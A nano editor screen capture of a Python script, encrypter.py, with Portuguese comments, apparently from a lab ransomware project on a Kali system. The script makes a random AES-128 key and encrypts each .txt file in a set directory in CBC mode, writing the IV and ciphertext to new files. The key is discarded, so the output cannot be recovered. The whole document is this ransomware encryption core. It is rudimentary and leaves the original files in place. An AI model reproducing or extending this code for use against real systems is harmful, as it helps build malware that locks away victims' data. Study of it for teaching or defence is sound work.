  GNU nano 7.2                                                        encrypter.py                                                                 
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes


def encrypt_file(key, input_file, output_file):
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv

    with open(input_file, 'rb') as file:
        plaintext = file.read()

    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

    with open(output_file, 'wb') as file:
        file.write(iv)
        file.write(ciphertext)


if __name__ == '__main__':
    encryption_key = get_random_bytes(16)  # Chave de criptografia de 16 bytes (128 bits)
    directory = '/home/kali/projeto-ransomware/'  # Diretório que contém os arquivos a serem criptografados

    for filename in os.listdir(directory):
        if filename.endswith('.txt'):
            input_file = os.path.join(directory, filename)
            encrypted_file = os.path.join(directory, f'{filename}_criptografado.txt')

            encrypt_file(encryption_key, input_file, encrypted_file)
            print("Arquivo criptografado gerado:", encrypted_file)
